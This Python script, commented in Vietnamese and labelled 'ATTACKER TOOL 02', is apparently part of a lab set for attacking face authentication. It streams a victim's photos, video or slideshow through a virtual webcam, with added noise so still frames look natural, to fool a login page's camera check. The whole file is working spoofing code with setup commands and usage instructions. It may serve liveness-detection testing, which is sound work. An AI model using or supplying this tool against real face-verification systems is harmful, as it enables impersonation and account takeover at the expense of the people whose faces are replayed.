"""
ATTACKER TOOL 02 - Replay Attack (Phát lại video/ảnh qua Virtual Webcam)
=========================================================================
Kịch bản: Attacker stream ảnh/video khuôn mặt nạn nhân qua webcam ảo,
          khiến hệ thống xác thực "thấy" khuôn mặt nạn nhân từ webcam.

Yêu cầu (Linux):
  sudo apt install v4l2loopback-dkms
  sudo modprobe v4l2loopback devices=1 video_nr=20 card_label="FakeWebcam"

Cách sử dụng:
  # Stream ảnh tĩnh:
  python 02_replay_attack.py --mode image --source ./victim_photos/face_00.jpg

  # Stream video:
  python 02_replay_attack.py --mode video --source victim_video.mp4

  # Stream thư mục ảnh (slideshow):
  python 02_replay_attack.py --mode slideshow --source ./victim_photos/

LƯU Ý: Sau khi chạy script, mở trình duyệt vào http://<server>:5000
        và chọn "FakeWebcam" làm camera input.
"""

import os
import sys
import time
import argparse
import cv2
import numpy as np

# Trên Linux, virtual webcam device mặc định
VIRTUAL_CAM_DEVICE = "/dev/video20"


def check_virtual_webcam():
    """Kiểm tra virtual webcam có sẵn không."""
    if sys.platform == "linux":
        if not os.path.exists(VIRTUAL_CAM_DEVICE):
            print("[!] Virtual webcam chưa được tạo!")
            print("[*] Chạy các lệnh sau:")
            print("    sudo apt install v4l2loopback-dkms")
            print('    sudo modprobe v4l2loopback devices=1 video_nr=20 card_label="FakeWebcam"')
            return False
        print(f"[+] Virtual webcam ready: {VIRTUAL_CAM_DEVICE}")
        return True
    else:
        print("[*] Trên Windows/macOS: dùng OBS Virtual Camera hoặc phần mềm tương tự")
        print("[*] Script sẽ hiển thị cửa sổ preview - bạn có thể dùng OBS capture window này")
        return True


def stream_image(image_path, device=VIRTUAL_CAM_DEVICE):
    """Stream một ảnh tĩnh liên tục qua virtual webcam."""
    print(f"[*] Loading: {image_path}")
    img = cv2.imread(image_path)
    if img is None:
        print(f"[!] Không đọc được: {image_path}")
        return

    # Resize cho phù hợp webcam
    img = cv2.resize(img, (640, 480))

    # Thử mở virtual webcam (Linux)
    vcam = None
    if sys.platform == "linux" and os.path.exists(device):
        try:
            vcam = cv2.VideoWriter(
                device, cv2.VideoWriter_fourcc(*'MJPG'), 30, (640, 480)
            )
            print(f"[+] Streaming qua virtual webcam: {device}")
        except Exception:
            pass

    print("[*] Streaming... Nhấn Q để dừng.")
    print("[*] Mở http://<server>:5000 và chọn FakeWebcam để xác thực.")

    while True:
        # Thêm chút nhiễu để trông tự nhiên hơn
        noise = np.random.normal(0, 2, img.shape).astype(np.uint8)
        frame = cv2.add(img, noise)

        if vcam is not None and vcam.isOpened():
            vcam.write(frame)

        # Hiển thị preview
        display = frame.copy()
        cv2.putText(display, "REPLAY ATTACK - Streaming...",
                    (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 0, 255), 2)
        cv2.putText(display, "Press Q to stop",
                    (10, 60), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 255), 1)
        cv2.imshow("Replay Attack Preview", display)

        if cv2.waitKey(33) & 0xFF == ord('q'):
            break

    if vcam is not None:
        vcam.release()
    cv2.destroyAllWindows()
    print("[*] Stream dừng.")


def stream_video(video_path, device=VIRTUAL_CAM_DEVICE):
    """Stream video khuôn mặt nạn nhân qua virtual webcam."""
    print(f"[*] Loading video: {video_path}")
    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        print(f"[!] Không mở được: {video_path}")
        return

    fps = cap.get(cv2.CAP_PROP_FPS) or 30
    delay = int(1000 / fps)

    # Virtual webcam
    vcam = None
    if sys.platform == "linux" and os.path.exists(device):
        try:
            vcam = cv2.VideoWriter(
                device, cv2.VideoWriter_fourcc(*'MJPG'), fps, (640, 480)
            )
        except Exception:
            pass

    print(f"[*] Streaming video @ {fps:.0f} FPS... Nhấn Q để dừng.")

    while True:
        ret, frame = cap.read()
        if not ret:
            cap.set(cv2.CAP_PROP_POS_FRAMES, 0)  # Loop video
            continue

        frame = cv2.resize(frame, (640, 480))

        if vcam is not None and vcam.isOpened():
            vcam.write(frame)

        display = frame.copy()
        cv2.putText(display, "REPLAY ATTACK - Video Stream",
                    (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 0, 255), 2)
        cv2.imshow("Replay Attack Preview", display)

        if cv2.waitKey(delay) & 0xFF == ord('q'):
            break

    cap.release()
    if vcam is not None:
        vcam.release()
    cv2.destroyAllWindows()


def stream_slideshow(photo_dir, device=VIRTUAL_CAM_DEVICE, interval=2.0):
    """Stream nhiều ảnh luân phiên (slideshow) qua virtual webcam."""
    extensions = {'.jpg', '.jpeg', '.png', '.bmp'}
    photos = sorted([
        os.path.join(photo_dir, f) for f in os.listdir(photo_dir)
        if os.path.splitext(f)[1].lower() in extensions
    ])

    if not photos:
        print(f"[!] Không tìm thấy ảnh trong: {photo_dir}")
        return

    print(f"[*] Tìm thấy {len(photos)} ảnh. Interval: {interval}s")

    vcam = None
    if sys.platform == "linux" and os.path.exists(device):
        try:
            vcam = cv2.VideoWriter(
                device, cv2.VideoWriter_fourcc(*'MJPG'), 30, (640, 480)
            )
        except Exception:
            pass

    idx = 0
    last_switch = time.time()

    print("[*] Streaming slideshow... Nhấn Q để dừng.")

    while True:
        if time.time() - last_switch > interval:
            idx = (idx + 1) % len(photos)
            last_switch = time.time()

        img = cv2.imread(photos[idx])
        if img is None:
            idx = (idx + 1) % len(photos)
            continue

        frame = cv2.resize(img, (640, 480))

        if vcam is not None and vcam.isOpened():
            vcam.write(frame)

        display = frame.copy()
        cv2.putText(display, f"REPLAY - Slideshow [{idx+1}/{len(photos)}]",
                    (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 0, 255), 2)
        cv2.imshow("Replay Attack Preview", display)

        if cv2.waitKey(33) & 0xFF == ord('q'):
            break

    if vcam is not None:
        vcam.release()
    cv2.destroyAllWindows()


def main():
    parser = argparse.ArgumentParser(
        description="Replay Attack - Stream ảnh/video nạn nhân qua virtual webcam"
    )
    parser.add_argument("--mode", choices=["image", "video", "slideshow"], required=True)
    parser.add_argument("--source", required=True, help="File ảnh/video hoặc thư mục")
    parser.add_argument("--device", default=VIRTUAL_CAM_DEVICE,
                        help=f"Virtual webcam device (mặc định: {VIRTUAL_CAM_DEVICE})")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="Slideshow interval giữa các ảnh (giây)")

    args = parser.parse_args()

    print("=" * 60)
    print("  REPLAY ATTACK - Phát lại khuôn mặt nạn nhân")
    print("=" * 60)

    check_virtual_webcam()

    if args.mode == "image":
        stream_image(args.source, args.device)
    elif args.mode == "video":
        stream_video(args.source, args.device)
    elif args.mode == "slideshow":
        stream_slideshow(args.source, args.device, args.interval)


if __name__ == "__main__":
    main()
